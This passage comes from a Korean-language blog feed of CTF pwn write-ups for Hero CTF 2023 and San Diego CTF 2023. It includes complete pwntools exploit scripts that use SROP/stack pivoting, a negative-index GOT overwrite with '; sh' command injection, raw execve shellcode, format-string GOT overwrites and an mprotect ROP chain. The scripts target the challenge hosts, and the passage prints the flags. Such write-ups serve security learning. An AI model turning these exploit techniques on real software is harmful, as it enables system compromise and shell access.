class="number">5002</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;?&#x27;</span>, p32(<span class="number">0xA736579</span>))</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x000000000040102f</span></span><br><span class="line">motivation_letter = <span class="number">0x40312C</span></span><br><span class="line">xor_rax_inc_rax = <span class="number">0x0000000000401011</span></span><br><span class="line">inc_rax = <span class="number">0x401013</span></span><br><span class="line">leave_ret = <span class="number">0x401114</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame(arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">0x3b</span></span><br><span class="line">frame.rdi = motivation_letter+<span class="number">0x178</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>)</span><br><span class="line">payload += p64(motivation_letter - <span class="number">8</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. rbp를 jump하고 싶은 주소 -8로 세팅 (rop 가젯이 있는 곳 - 8)</span></span><br><span class="line"><span class="comment"># 2. ret를 leave_ret주소로 변경</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">stack_pivot = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">stack_pivot += p64(xor_rax_inc_rax) <span class="comment"># 1</span></span><br><span class="line">stack_pivot += p64(inc_rax) * <span class="number">14</span></span><br><span class="line"></span><br><span class="line">stack_pivot += p64(syscall)</span><br><span class="line">stack_pivot += <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(stack_pivot)))</span><br><span class="line">stack_pivot += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, stack_pivot)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Hero </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack pivoting </tag>
            
            <tag> srop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hero CTF 2023 - Appointment Book (*addr = value)</title>
      <link href="/230518-heroctf2023-appointment-book/"/>
      <url>/230518-heroctf2023-appointment-book/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1951">https://ctftime.org/event/1951</a></li></ul><blockquote><p>Exploit this application to get the flag!<br>Host : nc static-03.heroctf.fr 5000<br>Format : Hero{flag}<br>Author : SoEasY<br>easy</p></blockquote><ul><li>[68 solves &#x2F; 298 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;========== Welcome to your appointment book. ==========&quot;</span>);</span><br><span class="line">  v5 = time(<span class="number">0LL</span>);</span><br><span class="line">  local_time = timestamp_to_date(v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[LOCAL TIME] %s\n&quot;</span>, local_time);</span><br></pre></td></tr></table></figure><p>처음에 main 함수에서 <code>local_time</code>을 출력해준다. 왜 출력해주는지 생각을 꼭 해야한다. 출력해 준 다음 여러 메뉴들이 있는데 <code>create_appointment</code> 메뉴만 보면 된다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_appointment</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 value; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 *addr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Enter the index of this appointment (0-7): &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx); <span class="comment">// oob</span></span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( idx &gt; <span class="number">7</span> );</span><br><span class="line">  addr = (&amp;appointments + <span class="number">16</span> * idx);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Enter a date and time (YYYY-MM-DD HH:MM:SS): &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">30</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  value = date_to_timestamp(s);</span><br><span class="line">  *addr = value; <span class="comment">// 원하는 주소에 원하는 값 쓰기 가능</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Converted to UNIX timestamp using local timezone: %ld\n&quot;</span>, *addr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Enter an associated message (place, people, notes...): &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(v4, <span class="number">62</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  addr[<span class="number">1</span>] = v4;</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>idx</code>가 <code>int</code> 자료형을 가지고 있기 때문에 <code>oob</code>가 발생한다. 이 인덱스를 가지고 <code>addr</code> 변수 위로 접근할 수 있다. 위에는 <code>got</code>들이 자리잡고 있는데 원하는 곳에 접근해서 원하는 값을 쓸 수 있다. <code>system(&quot;/bin/sh&quot;)</code>를 호출하는 함수를 정의해놨기 때문에 이 함수 주소를 쓰면 될 듯 하다.</p><p>이때 주의해야할 점이 쓰고 싶은 주소 값을 <code>YYYY-MM-DD HH:MM:SS</code> 형식으로 만들어서 입력해야 <code>date_to_timestamp</code> 함수를 거쳐 정상적인 주소 값을 쓸 수 있게 된다. 그래서 ida에서 <code>date_to_timestamp</code> 함수 구현을 보고 c로 재작성하였다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// timestamp_to_date</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tp</span>;</span></span><br><span class="line"><span class="type">time_t</span> timer;</span><br><span class="line"><span class="type">char</span>* s;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    timer = atoll(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// scanf(&quot;%ld&quot;, &amp;timer);</span></span><br><span class="line">    s = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    tp = localtime(&amp;timer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !tp )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Error converting the UNIX timestamp to a date and time&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    strftime(s, <span class="number">0x20</span>uLL, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, tp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>문제에서 정의해준 시스템 함수를 사용해도 되지만 이게 없더라도 익스할 수 있다. <code>free</code>의 <code>got</code>를 <code>system</code>으로 덮고 command injection을 이용해서 원하는 값을 넣을 때 <code>; sh</code>도 함께 넣어주었다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>처음에 로컬에서는 잘 되었는데 리모트는 죽어도 되질 않았다. 그 이유는 로컬과 리모트의 <code>local_time</code>이 다르기 때문이다. 문제 초반에 출력을 해주므로 타임존을 알아내서 <code>TZ</code> 환경변수를 아래처럼 바꿔주었다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TZ=IS</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./appointment_book&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./appointment_book&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;static-03.heroctf.fr&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># export TZ=IS</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;-13&#x27;</span>)</span><br><span class="line"></span><br><span class="line">timestr = subprocess.check_output([<span class="string">&#x27;./timestamp_to_date&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x401180</span>)]).strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(timestr))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, timestr + <span class="string">b&#x27; ; sh&#x27;</span>)</span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;:&#x27;, &#x27;1970-02-18 15:27:02&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hero&#123;Unch3ck3d_n3g4t1v3_1nd3x_1nt0_G0T_0v3wr1t3_g03s_brrrrrr&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Hero </category>
          
      </categories>
      
      
        <tags>
            
            <tag> command injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>San Diego CTF 2023 Write ups</title>
      <link href="/230515-sandiegoctf2023-PWN/"/>
      <url>/230515-sandiegoctf2023-PWN/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1910">https://ctftime.org/event/1910</a></li></ul><p>1주일 뒤에나 작성하는 Write ups.. 한 문제 빼고 다 풀었는데 못 푼 문제는 너무 극악의 fsb였다. 나머지 문제는 쉽게 풀이했던 걸로 기억. </p><h2 id="Turtle-Shell"><a href="#Turtle-Shell" class="headerlink" title="Turtle Shell"></a>Turtle Shell</h2><blockquote><p>A turtle without it’s shell is a sad sight to see<br>Connect via: <code>nc turtle.sdc.tf 1337</code><br>Dockerfile turtle-shell</p></blockquote><ul><li>[111 solves &#x2F; 100 points]</li></ul><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./turtle-shell&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;turtle.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./turtle-shell&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># sdctf&#123;w0w_y0u_m4d3_7h3_7urT13_c0m3_0u7_0f_1t5_5h3l1&#125;</span></span><br></pre></td></tr></table></figure><h2 id="money-printer"><a href="#money-printer" class="headerlink" title="money-printer"></a>money-printer</h2><blockquote><p>The first step to getting rich is printing money<br>Connect via: <code>nc money.sdc.tf 1337</code><br>Dockerfile money-printer</p></blockquote><ul><li>[140 solves &#x2F; 150 points]</li></ul><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./money-printerp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;money.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./money-printerp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. exit@got -&gt; main</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">16</span>,</span><br><span class="line">        &#123;e.got[<span class="string">&#x27;exit&#x27;</span>] : e.symbols[<span class="string">&#x27;main&#x27;</span>] &#125;)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#51</span></span><br><span class="line"><span class="comment"># - 0x21c87</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%57$p&#x27;</span></span><br><span class="line"><span class="comment"># payload = b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x21c87</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># system = libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># printf@got -&gt; system</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">16</span>,</span><br><span class="line">        &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])[:<span class="number">4</span>] &#125;,</span><br><span class="line">        write_size = <span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;?\n&#x27;, &#x27;-1&#x27;)</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;?\n&#x27;, &#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># -1</span></span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line"><span class="comment"># sdctf&#123;d4mn_y0u_f0unD_4_Cr4zY_4M0uN7_0f_M0n3y&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Canary                        : ✓ (value: 0xedabb8ef1d292700)</span></span><br><span class="line"><span class="comment"># NX                            : ✓</span></span><br><span class="line"><span class="comment"># PIE                           : ✘</span></span><br><span class="line"><span class="comment"># Fortify                       : ✘</span></span><br><span class="line"><span class="comment"># RelRO                         : Partial</span></span><br></pre></td></tr></table></figure><h2 id="tROPic-thunder"><a href="#tROPic-thunder" class="headerlink" title="tROPic-thunder"></a>tROPic-thunder</h2><blockquote><p>I hope this isn’t your first rodeo<br>Connect via: <code>nc thunder.sdc.tf 1337</code><br>Dockerfile tROPic-thunder</p></blockquote><ul><li>[69 solves &#x2F; 250 points]</li></ul><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>seccomp이 걸려있지만 평이하게 걸려있다. <code>execve</code>를 실행시키자.</p><p><code>mprotect</code>가 있는 한, 이것을 실행시켜 특정 공간에 실행 권한을 주고 거기에 쉘 코드를 넣어서 그 곳으로 점프하는 생각을 하자.</p><h3 id="Exploit-Code-2"><a href="#Exploit-Code-2" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./tROPic-thunder&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;thunder.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./tROPic-thunder&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x41003c</span></span><br><span class="line">pop_rax = <span class="number">0x4005af</span></span><br><span class="line">pop_rdi = <span class="number">0x4006a6</span></span><br><span class="line">pop_rsi = <span class="number">0x40165c</span></span><br><span class="line">pop_rdx = <span class="number">0x4589f5</span></span><br><span class="line"></span><br><span class="line">bss = e.bss() + <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span> + <span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># mprotect(bss, 0x1000, 7)</span></span><br><span class="line"><span class="comment"># payload += p64(pop_rax)</span></span><br><span class="line"><span class="comment"># payload += p64(10)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0x4000</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(syscall)</span></span><br><span class="line"><span class="comment"># read(0, bss, 0x1000)</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x4000</span>)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(syscall)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(0x41414141) # jmp!</span></span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>) <span class="comment"># jmp!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open, read, write</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = asm(payload)</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span 